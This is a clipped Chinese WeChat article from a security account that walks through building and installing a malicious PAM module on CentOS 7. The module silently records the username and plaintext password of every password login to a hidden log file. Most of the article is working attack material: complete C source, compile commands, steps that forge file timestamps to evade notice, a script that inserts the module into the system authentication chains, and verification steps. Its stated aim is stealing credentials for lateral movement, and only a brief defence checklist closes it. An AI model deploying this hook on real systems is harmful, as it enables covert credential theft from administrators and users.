---
title: 【微信】PAM钩子抓取root登录密码:原理与完整详细操作步骤
source: https://mp.weixin.qq.com/s/jdIkjzGyI1R0-Nq28pTbcw
source_host: mp.weixin.qq.com
clip_date: 2026-10-19T16:40:32+08:00
trace_id: a07c18bf-dcc0-44dc-b275-bb4a28d46a7c
content_hash: b18c171fb5df98d60d48dc0a0efd8866c36dd1c5da380a9d8854aa7686ef1f65
status: synced
tags:
  - 微信
  - Linux安全
  - 风控对抗
series: null
feed_source: 公众号聚合·Doonsec
ai_summary: 编写自定义 PAM 模块插入认证链，读取 `PAM_AUTHTOK` 中的密码明文并保存到文件，就能在不影响正常登录的情况下记录所有密码登录凭据。
ai_summary_style: key-points
images_status:
  total: 4
  succeeded: 4
  failed_urls: []
notion_page_id: 3fe75244-d011-81a8-b037-f1c5f81159fc
ioc: null
---

> 💡 **AI 总结（key-points）**
>
> 编写自定义 PAM 模块插入认证链，读取 `PAM_AUTHTOK` 中的密码明文并保存到文件，就能在不影响正常登录的情况下记录所有密码登录凭据。
> 
> - **核心原理：** PAM 在认证过程中会把用户输入的密码明文暂存到 `PAM_AUTHTOK`（常量 6，不是表示旧密码的 7），认证链上任意模块都可以读取它；因此让钩子模块始终返回 `PAM_SUCCESS`，认证结果仍由后续的 `pam_unix.so` 决定，用户对钩子无感知。
> - **免开发库编译：** CentOS 7 已 EOL，yum 源失效，导致装不上 pam-devel；源码采用手写前向声明，并用 `gcc -shared -fPIC -o pam_evil.so pam_evil.c /lib64/libpam.so.0` 直接链接运行库。
> - **挂载要点：** 在 `/etc/pam.d/password-auth` 与 `system-auth` 中首个 `pam_unix.so` 行之前插入 `auth optional pam_evil.so`；如果误写成 `sufficient`，就会跳过密码校验，导致任何人随意输入密码都能登录，从而立刻暴露。
> - **验证技巧：** 用 `ssh -o PubkeyAuthentication=no -o PreferredAuthentications=password root@127.0.0.1` 故意输入错误密码，错误密码同样会被记录，避免反复输错触发账号锁定；若日志为空，需要改用 `pam_get_authtok` 主动索取密码。
> - **善后与排查：** 用 `touch -r pam_unix.so` 伪造时间戳，设置日志权限 600；清理时用 `sed -i '/pam_evil\.so/d'` 删除挂载行并删除模块与日志；防御侧应检查 `/etc/pam.d/`、`/lib64/security/`、`/var/log` 隐藏文件及文件哈希基线。密钥登录不经过 PAM_AUTHTOK，因此抓不到密码。

**Z0安全** *2026年10月19日 16:14*

## 一、这个技术是什么

PAM(Pluggable Authentication Modules,可插拔认证模块)是Linux的认证框架。用户登录时,sshd、su、sudo这些程序不自己验证密码,而是把密码交给PAM框架,由框架按配置文件里写好的模块链依次处理。

关键点在于:PAM在认证过程中,会把用户输入的密码明文暂时存在会话里,认证链上的每个模块都能用 `pam_get_item(PAM_AUTHTOK)` 把这个明文读出来。

所以思路很直接:写一个PAM模块,插到认证链上,密码登录发生时把明文记到我们自己的日志文件。模块本身不做任何校验,认证结果完全交给原来的 `pam_unix.so`,用户无感知,登录行为零影响。

这个技术常用于攻防的内网横向:通过漏洞已经拿到shell,获取root权限。但不知道密码明文;装上钩子后,后续任何人的密码登录(包括管理员、其他运维)都会被记录,而这些密码往往在网内其他机器上复用。有时候往往一个密码就能成为打开一片内网机器。

## 二、整体思路

```
登录请求(root密码明文)
    → PAM框架收到,密码暂存于 PAM_AUTHTOK
    → 认证链逐个执行模块:
        ① pam_evil.so   ← 我们插入的,读 PAM_AUTHTOK 明文,写入日志
        ② pam_unix.so   ← 原来的,比对 /etc/shadow 哈希,决定登录成败
    → 登录正常进行,任何人无感知
```

## 三、操作步骤

全程需要目标机的root权限。

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/6f1f2d29d24bf496.png)

### 第1步:编写模块源码

新建 `pam_evil.c` （webshell权限cat多行容易报错，建议使用文件上传到服务器）:

```cpp
// pam_evil.c — PAM钩子:抓取登录密码明文
// 编译: gcc -shared -fPIC -o pam_evil.so pam_evil.c /lib64/libpam.so.0
#include<stdio.h>
#include<string.h>
#include<time.h>
#include<sys/stat.h>
#include<unistd.h>

typedefstructpam_handlepam_handle_t;
intpam_get_item(constpam_handle_t *pamh, int item_type, constvoid **item);
intpam_get_authtok(pam_handle_t *pamh, int item, constchar **authtok, constchar *prompt);

#define PAM_EXTERN extern
#define PAM_USER    2   // PAM官方ABI常量
#define PAM_AUTHTOK 6   // 密码明文槽位(7是旧密码槽位,别搞错)
#define PAM_SUCCESS 0

#define LOGPATH "/var/log/.xlog"   // 密码落盘位置

static FILE *open_log(void) {
    FILE *fp = fopen(LOGPATH, "a");
    if (fp) fchmod(fileno(fp), 0600);
    return fp;
}

PAM_EXTERN intpam_sm_authenticate(pam_handle_t *pamh, int flags, int argc, constchar **argv) {
    constvoid *u = NULL;
    constchar *user = "?", *pass = NULL;

    pam_get_item(pamh, PAM_USER, &u);       // 读取登录用户名
    if (u) user = (constchar *)u;

    // 密码槽位如果还是空的,主动向框架要密码
    if (pam_get_item(pamh, PAM_AUTHTOK, (constvoid **)&pass) != PAM_SUCCESS || !pass)
        pam_get_authtok(pamh, PAM_AUTHTOK, &pass, NULL);

    if (pass && pass[0]) {                  // 有密码就落盘
        FILE *fp = open_log();
        if (fp) {
            fprintf(fp, "[%ld] %s:%s\n", (long)time(NULL), user, pass);
            fclose(fp);
        }
    }
    return PAM_SUCCESS;   // 恒返回成功,认证结果由后续 pam_unix.so 决定
}

PAM_EXTERN intpam_sm_setcred(pam_handle_t *pamh, int flags, int argc, constchar **argv) { return PAM_SUCCESS; }
PAM_EXTERN intpam_sm_acct_mgmt(pam_handle_t *pamh, int flags, int argc, constchar **argv) { return PAM_SUCCESS; }
PAM_EXTERN intpam_sm_open_session(pam_handle_t *pamh, int flags, int argc, constchar **argv) { return PAM_SUCCESS; }
PAM_EXTERN intpam_sm_close_session(pam_handle_t *pamh, int flags, int argc, constchar **argv) { return PAM_SUCCESS; }
PAM_EXTERN intpam_sm_chauthtok(pam_handle_t *pamh, int flags, int argc, constchar **argv) { return PAM_SUCCESS; }
```

说明两点:

-   • 源码里没有 `#include <security/pam_appl.h>` 头文件,是手写的前向声明。原因是CentOS 7 EOL后yum源已失效(阿里云镜像对repomd.xml返回403),pam-devel装不上。模块实际只用两个函数声明和几个常量,手写完全够用。
    
-   • 编译直接链接系统运行库 `/lib64/libpam.so.0`,不依赖 `-lpam` 开发库。

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/dff65f1ec4d97b14.png)
    

### 第2步:编译

```
gcc -shared -fPIC -o pam_evil.so pam_evil.c /lib64/libpam.so.0
```

无输出即编译成功,生成的 `pam_evil.so` 就是插件模块。

### 第3步:安装模块文件

```bash
# 放到PAM模块目录(64位系统为 /lib64/security)
cp pam_evil.so /lib64/security/pam_evil.so
chmod 755 /lib64/security/pam_evil.so
# 把时间戳改成和其他模块一致,避免被人一眼看出是新文件
touch -r /lib64/security/pam_unix.so /lib64/security/pam_evil.so

# 创建日志文件,权限600只有root能读
touch /var/log/.xlog && chmod 600 /var/log/.xlog
```

### 第4步:挂载到认证链

CentOS 7下密码登录走的认证链是 `/etc/pam.d/password-auth` (SSH)和 `/etc/pam.d/system-auth` (su/sudo)。在两个文件的首个 `pam_unix.so` 行之前,插入我们的模块:

```bash
for f in /etc/pam.d/password-auth /etc/pam.d/system-auth; do
  [ -f "$f.bak" ] || cp "$f" "$f.bak"          # 先备份,方便还原
  grep -q pam_evil.so "$f" || awk '/^auth.*pam_unix\.so/ && !d {print "auth        optional     pam_evil.so"; d=1} {print}' "$f" > "$f.new"
  /bin/mv -f "$f.new" "$f"
done
```

挂载行:`auth optional pam_evil.so` 。

注意必须是 `optional` 而不是 `sufficient`:模块恒返回成功,如果写成 `sufficient` 会直接放行并跳过 `pam_unix.so` 的密码校验,等于任何人都能乱输一个密码登录,立刻暴露。

查看挂载结果:

```
grep -n pam_evil /etc/pam.d/password-auth /etc/pam.d/system-auth
```

应看到:

```
/etc/pam.d/password-auth:6:auth        optional     pam_evil.so
/etc/pam.d/system-auth:7:auth          optional     pam_evil.so
```

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/d2a26afbe7cee3bd.png)

### 第5步:验证

验证技巧:故意输一个错误密码。错误密码也会被记录,不需要等真实密码出现,也不会输错多次触发锁定。

```
# 强制走密码认证登录本机(不走密钥)
ssh -o PubkeyAuthentication=no -o PreferredAuthentications=password root@127.0.0.1
# 输入一个随便的密码 → 被拒绝(Permission denied)
# 然后查看日志:
cat /var/log/.xlog
```

能看到形如下面的记录,说明钩子生效:

```
[1792376300] root:123123123123
[1792376303] root:231123123
```

到这里,后续任何人用密码登录这台机器,账号和明文密码都会写入 `/var/log/.xlog` 。

![图片](https://cdn.jsdelivr.net/gh/zhiyu-zeng/img@main/img/2026/10/8ede46f69536c586.png)

### 第6步:清理还原

测试完还原现场:

```swift
# 从认证链移除
sed -i '/pam_evil\.so/d' /etc/pam.d/password-auth /etc/pam.d/system-auth
# 删除模块和日志
rm -f /lib64/security/pam_evil.so /var/log/.xlog
# (如有备份也可直接恢复)
# cp /etc/pam.d/password-auth.bak /etc/pam.d/password-auth
# cp /etc/pam.d/system-auth.bak /etc/pam.d/system-auth
```

## 四、常见问题

| 问题  | 原因  | 解决  |
| --- | --- | --- |
| 编译报pam头文件缺失 | CentOS7 EOL,yum源失效装不了pam-devel | 手写前向声明,直接链 `/lib64/libpam.so.0` |
| 日志文件为空 | `PAM_AUTHTOK`<br><br>常量写错(写成了7) | 必须是6,7是 `PAM_OLDAUTHTOK` 旧密码槽 |
| 常量对但日志还是空 | 模块挂在链最前,框架还没收集到密码 | 用 `pam_get_authtok` 主动向框架要密码 |
| 挂载后任何人乱输密码都能登录 | 挂载行用了 `sufficient` | 改成 `optional` |
| 密钥登录抓不到密码 | 密钥认证不走PAM_AUTHTOK | 只有密码登录才会触发 |

## 五、防御建议

-   • 定期检查 `/etc/pam.d/` 下各配置,确认auth段没有不明模块
    
-   • 检查 `/lib64/security/` 目录,留意不明的.so文件及时间戳
    
-   • 关注 `/var/log/secure` 中 `pam_*` 相关异常日志
    
-   • 扫描 `/var/log` 下的隐藏文件
    
-   • 有条件的系统可对关键目录做文件hash基线,定期比对
    

## 适用范围

-   • 目标:Linux服务器(系统需有PAM,几乎所有主流发行版都有)
    
-   • 前提:已拿到root权限
    
-   • 用途:内网横向获取密码凭据,密码复用率高,拿到一个root密码往往能打开一片机器
    

师傅，来个三连吧~

请在微信客户端打开
